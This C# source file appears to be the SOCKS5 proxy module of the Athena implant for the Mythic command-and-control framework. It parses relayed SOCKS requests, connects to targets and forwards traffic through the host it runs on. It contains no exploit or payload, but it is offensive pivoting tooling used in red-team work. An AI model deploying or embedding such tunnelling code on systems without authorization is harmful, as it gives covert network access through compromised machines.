﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using Athena.Models.Mythic.Response;
using Athena.Utilities;

namespace Athena.Models.Athena.Socks
{
    public class ConnectionOptions
    {
        public IPEndPoint endpoint { get; set; }
        public IPAddress ip { get; set; }
        public Socket socket { get; set; }
        //public TcpClient socket { get; set; }
        public AddressFamily addressFamily { get; set; }
        public ConnectResponseStatus connectStatus { get; set; } = ConnectResponseStatus.GeneralFailure;
        public bool connected { get; set; }
        public byte addressType { get; set; }
        public byte[] dstportBytes { get; set; }
        public byte[] dstBytes { get; set; }
        public byte[] bndPortBytes { get; set; }
        public byte[] bndBytes { get; set; }
        public int port { get; set; } = 0;
        public int server_id { get; set; }
        public string fqdn { get; set; }

        public override string ToString()
        {
            string output = "";
            output += String.Format($"[IP] {this.ip.ToString()}") + Environment.NewLine;
            output += String.Format($"[FQDN] {this.fqdn}") + Environment.NewLine;
            output += String.Format($"[PORT] {this.port}") + Environment.NewLine;
            output += String.Format($"[CONNECTED] {this.connected}") + Environment.NewLine;
            return output;
        }

        public ConnectionOptions(SocksMessage sm)
        {
            if (ParsePacket(Misc.Base64DecodeToByteArray(sm.data)))
            {

                //Change this socket request based on datagram[1]
                if (this.addressFamily != AddressFamily.Unknown) { this.socket = GetSocket(); }
                if (this.socket is not null) { this.endpoint = new IPEndPoint(this.ip, this.port); }
                if (this.endpoint is null) { this.connected = false; this.connectStatus = ConnectResponseStatus.HostUnreachable; }
            }
            this.server_id = sm.server_id;
            if (this.socket is not null && this.endpoint != null)
            {
                this.connected = InitiateConnection(sm);
            }
        }
        private bool ParsePacket(byte[] packetBytes)
        {
            try
            {
                //Get the remote port from the packet
                this.port = GetPort(packetBytes);

                //Figure out the final destination
                List<byte> destBytes = new List<byte>();
                int packetBytesLength = packetBytes.Length;
                for (int i = 4; i < (packetBytesLength - 2); i++)
                {
                    destBytes.Add(packetBytes[i]);
                }

                this.dstBytes = destBytes.ToArray();
                this.addressType = packetBytes[3];

                //Check to see what type of destination value we have (IPv4, IPv6, or FQDN)
                switch (this.addressType)
                {
                    case (byte)0x01: //IPv4
                        this.ip = new IPAddress(destBytes.ToArray());
                        this.addressFamily = AddressFamily.InterNetwork;
                        return true;
                    case (byte)0x03: //FQDN
                        //Get DNS Results for the IP
                        this.fqdn = Encoding.ASCII.GetString(destBytes.ToArray());
                        IPAddress[] ipAddresses = Dns.GetHostEntry(this.fqdn).AddressList;

                        if (ipAddresses.Count() > 0)
                        {
                            //Get first IP result and the AddressFamily of that result.
                            this.ip = ipAddresses[0];
                            this.addressFamily = ipAddresses[0].AddressFamily;
                            return true;
                        }
                        else
                        {
                            //Couldn't resolve DNS
                            Misc.WriteDebug("DNS Failed.");
                            this.endpoint = null;
                            this.addressFamily = AddressFamily.Unknown;
                            return false;
                        }
                    case (byte)0x04: //IPv6
                        this.ip = new IPAddress(destBytes.ToArray());
                        this.addressFamily = AddressFamily.InterNetworkV6;
                        return true;
                    default: //Fail
                        this.addressFamily = AddressFamily.Unknown;
                        return false;
                }
            }
            catch
            {
                return false;
            }
        }
        //private TcpClient GetSocket()
        //{
        //    TcpClient s = null;
        //    try
        //    {
        //        IPEndPoint localEndPoint;
        //        switch (this.addressFamily)
        //        {
        //            case AddressFamily.InterNetwork: //IPv4
        //                {
        //                    localEndPoint = new IPEndPoint(IPAddress.Any, 0);

        //                    s = new TcpClient(localEndPoint);


        //                    //s = new TcpClient(localEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
        //                    //s.Bind(localEndPoint);
        //                    this.bndBytes = IPAddress.Loopback.GetAddressBytes();
        //                    this.bndPortBytes = GetPortBytes((UInt16)((IPEndPoint)s.Client.LocalEndPoint).Port);
        //                    return s;
        //                }
        //            case AddressFamily.InterNetworkV6: //IPv6
        //                {
        //                    localEndPoint = new IPEndPoint(IPAddress.Any, 0);

        //                    s = new TcpClient(localEndPoint);
        //                    this.bndBytes = IPAddress.Loopback.GetAddressBytes();
        //                    this.bndPortBytes = GetPortBytes((UInt16)((IPEndPoint)s.Client.LocalEndPoint).Port);
        //                    return s;
        //                }
        //            default:
        //                {
        //                    this.connected = false;
        //                    this.connectStatus = ConnectResponseStatus.AddressTypeNotSupported;
        //                    return null;
        //                }
        //        }
        //    }
        //    catch
        //    {
        //        this.connected = false;
        //        this.connectStatus = ConnectResponseStatus.GeneralFailure;
        //        return null;
        //    }
        //}

        private Socket GetSocket()
        {
            Socket s = null;
            try
            {
                IPEndPoint localEndPoint;
                switch (this.addressFamily)
                {
                    case AddressFamily.InterNetwork: //IPv4
                        {
                            localEndPoint = new IPEndPoint(IPAddress.Any, 0);
                            s = new Socket(localEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                            s.Bind(localEndPoint);
                            this.bndBytes = IPAddress.Loopback.GetAddressBytes();
                            this.bndPortBytes = GetPortBytes((UInt16)((IPEndPoint)s.LocalEndPoint).Port);
                            return s;
                        }
                    case AddressFamily.InterNetworkV6: //IPv6
                        {
                            localEndPoint = new IPEndPoint(IPAddress.Any, 0);
                            s = new Socket(localEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                            s.Bind(localEndPoint);
                            this.bndBytes = IPAddress.IPv6Loopback.GetAddressBytes();
                            this.bndPortBytes = GetPortBytes((UInt16)((IPEndPoint)s.LocalEndPoint).Port);
                            return s;
                        }
                    default:
                        {
                            this.connected = false;
                            this.connectStatus = ConnectResponseStatus.AddressTypeNotSupported;
                            return null;
                        }
                }
            }
            catch
            {
                this.connected = false;
                this.connectStatus = ConnectResponseStatus.GeneralFailure;
                return null;
            }
        }
        private int GetPort(byte[] packetBytes)
        {
            try
            {
                int packetBytesLength = packetBytes.Length;

                //Get last two bytes of datagram, which contain the port in little endian format
                byte[] portBytes = new byte[] { packetBytes[packetBytesLength - 2], packetBytes[packetBytesLength - 1] };
                this.dstportBytes = portBytes;

                //Reverse for little endian
                Array.Reverse(portBytes);

                //Return the port
                return Convert.ToInt32(BitConverter.ToUInt16(portBytes));
            }
            catch
            {
                this.connected = false;
                this.connectStatus = ConnectResponseStatus.GeneralFailure;
                return 0;
            }
        }
        private byte[] GetPortBytes(UInt16 port)
        {
            byte[] portBytes = BitConverter.GetBytes(port);
            if (BitConverter.IsLittleEndian)
            {
                return portBytes;
            }
            else
            {
                //Reverse that bitch
                return new byte[] { portBytes[1], portBytes[0] };
            }
        }
        public bool ForwardPacket(SocksMessage sm)
        {
            try
            {
                //Convert datagram to byte[]
                byte[] datagram = Misc.Base64DecodeToByteArray(sm.data);

                //Check datagram
                if (datagram.Length > 0)
                {
                    //Forward datagram to endpoint
                    this.socket.Send(Misc.Base64DecodeToByteArray(sm.data));
                    //NetworkStream stream = this.socket.GetStream();
                    //stream.Write(Misc.Base64DecodeToByteArray(sm.data));
                    return true;
                }
                else
                {
                    //We get an empty datagram for a connection we're currently following.
                    if (sm.exit)
                    {
                        #region commented out
                        //Misc.WriteDebug("[ServerID] " + sm.server_id + " exit.");
                        //Datagram is an exit packet from Mythic, let's close the connection, dispose of the socket, and remove it from our tracker.
                        //if (this.connections.ContainsKey(sm.server_id))
                        //{
                        //    this.connections[sm.server_id].socket.Disconnect(true);
                        //    this.connections[sm.server_id].socket.Close();
                        //    this.connections.Take(sm.server_id);
                        //}
                        #endregion
                        return true;
                        #region commented out
                        //Remove from our tracker
                        //while (!this.connections.TryRemove(this.connections.Where(kvp => kvp.Value.server_id == sm.server_id).FirstOrDefault())) ;
                        //ConnectionOptions cn;
                        //while (!this.connections.TryRemove(sm.server_id, out cn)) { }
                        //Misc.WriteDebug("Removed Connection.");

                        //No reason really to send a response to Mythic
                        #endregion
                    }
                    else
                    {
                        Misc.WriteDebug("[EmptyNonExitPacket] Sent by ID: " + sm.server_id);
                        return false;
                    }
                    //Do I need an else for this? What do we do with empty data packets?
                }
            }
            catch (SocketException e)
            {
                //We hit an error, let's figure out what it is.
                Misc.WriteDebug(e.Message + $"({e.ErrorCode})");
                return false;

                #region junk
                ////Tell mythic that we've closed the connection and that it's time to close it on the client end.
                //SocksMessage smOut = new SocksMessage()
                //{
                //    server_id = sm.server_id,
                //    data = "",
                //    exit = true
                //};

                ////Add to our messages queue.
                //this.messagesOut.Enqueue(smOut);

                //Remove connection from our tracker.
                //while (!this.connections.TryRemove(this.connections.Where(kvp => kvp.Value.server_id == sm.server_id).FirstOrDefault())) ;
                #endregion
            }
        }
        private bool InitiateConnection(SocksMessage sm)
        {
            byte[] datagram = Misc.Base64DecodeToByteArray(sm.data);
            
            if(datagram.Length <= 0)
            {
                this.connectStatus = ConnectResponseStatus.GeneralFailure;
                return false;
            }
            else if (datagram[0] != (byte)0x05)
            {
                this.connectStatus = ConnectResponseStatus.ProtocolError;
                return false;
            }
            else
            {
                try
                {
                    //Attempt to connect to the endpoint.
                    this.socket.Connect(this.endpoint);
                    this.connectStatus = ConnectResponseStatus.Success;
                    return true;
                }
                catch (SocketException e)
                {
                    Misc.WriteDebug(e.Message + $"({e.ErrorCode})");
                    //We failed to connect likely. Why though?
                    ConnectResponse cr = new ConnectResponse()
                    {
                        //this need to be localhost
                        bndaddr = new byte[] { 0x00, 0x00, 0x00, 0x00 },
                        //this needs to be the bind port
                        bndport = new byte[] { 0x00, 0x00 },
                        addrtype = 0x00
                    };
                    //Get error reason.
                    switch (e.ErrorCode)
                    {
                        case 10065: //Host Unreachable
                            this.connectStatus = ConnectResponseStatus.HostUnreachable;
                            break;
                        case 10047: //Address Family Not Supported
                            this.connectStatus = ConnectResponseStatus.AddressTypeNotSupported;
                            break;
                        case 10061: //Connection Refused
                            this.connectStatus = ConnectResponseStatus.ConnectionRefused;
                            break;
                        case 10051: //Network Unreachable
                            this.connectStatus = ConnectResponseStatus.NetworkUnreachable;
                            break;
                        case 10046: //Protocol Family Not Supported
                            this.connectStatus = ConnectResponseStatus.ProtocolError;
                            break;
                        case 10043: //Protocol Not Supported
                            this.connectStatus = ConnectResponseStatus.ProtocolError;
                            break;
                        case 10042: //Protocol Option
                            this.connectStatus = ConnectResponseStatus.ProtocolError;
                            break;
                        case 10041: //Protocol Type
                            this.connectStatus = ConnectResponseStatus.ProtocolError;
                            break;
                        case 10060: //Timeout
                            this.connectStatus = ConnectResponseStatus.TTLExpired;
                            break;
                        default: //Everything else
                            this.connectStatus = ConnectResponseStatus.GeneralFailure;
                            break;
                    }
                    return false;
                }
            }
        }
        //public List<byte[]> receiveMessages(){
        //    try
        //    {
        //        using (NetworkStream stream = this.socket.GetStream())
        //        {
        //            byte[] data = new byte[1024];
        //            using (MemoryStream ms = new MemoryStream())
        //            {

        //                int numBytesRead;
        //                while ((numBytesRead = stream.Read(data, 0, data.Length)) > 0)
        //                {
        //                    ms.Write(data, 0, numBytesRead);
        //                }

        //                return new List<byte[]> { ms.ToArray() };
        //            }
        //        }
        //    }
        //    catch (Exception e)
        //    {
        //        Misc.WriteDebug(e.Message);
        //        return new List<byte[]>();
        //    }
        //}



        public List<byte[]> receiveMessages()
        {
            List<byte[]> lstOut = new List<byte[]>();
            byte[] bytes;
            int bytesRec;

            //If you are using a non-blocking Socket, Available is a good way to determine whether data is queued for reading, before calling Receive.
            //The available data is the total amount of data queued in the network buffer for reading. If no data is queued in the network buffer, Available returns 0.
            //https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.socket.available?view=net-5.0
            while (this.socket.Available != 0)
            {
                //Let's allocate our bytes, either in 512k chunks or less.
                if (this.socket.Available < 512000)
                {
                    bytes = new byte[this.socket.Available];
                }
                else
                {
                    bytes = new byte[512000];
                }
                //Receive our allocation.



                bytesRec = this.socket.Receive(bytes);
                lstOut.Add(bytes);
            }
            return lstOut;

            //https://github.com/MythicAgents/poseidon/blob/master/Payload_Type/poseidon/agent_code/socks/socks.go#L314
            //Should I be doing this?
            //smOut = new SocksMessage()
            //{
            //    server_id = conn.server_id,
            //    data = Misc.Base64Encode(new byte[] { }),
            //    exit = true
            //};
            //this.messagesOut.Enqueue(smOut);
        }
    }
}
